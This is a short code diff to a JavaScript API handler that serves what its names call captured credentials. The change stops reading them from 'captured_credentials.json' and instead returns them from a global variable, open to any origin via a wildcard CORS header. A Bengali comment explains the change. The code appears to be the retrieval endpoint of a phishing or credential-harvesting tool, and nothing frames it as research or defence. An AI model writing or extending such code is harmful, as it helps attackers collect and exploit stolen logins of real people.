@@ -1,17 +1,11 @@
-import fs from 'fs';
-import path from 'path';
-
 export default async function handler(req, res) {
-  const filePath = path.join(process.cwd(), 'captured_credentials.json');
+  res.setHeader('Access-Control-Allow-Origin', '*');
   
-  if (!fs.existsSync(filePath)) {
-    return res.status(200).json([]);
+  if (req.method !== "GET") {
+    return res.status(405).json({ error: "Method not allowed" });
   }
 
-  try {
-    const data = fs.readFileSync(filePath, 'utf8');
-    return res.status(200).json(JSON.parse(data));
-  } catch (error) {
-    return res.status(500).json({ error: "Failed to read data" });
-  }
+  // গ্লোবাল ভ্যারিয়েবল থেকে ডেটা রিটার্ন করবে
+  const data = global.capturedData || [];
+  return res.status(200).json(data);
 }
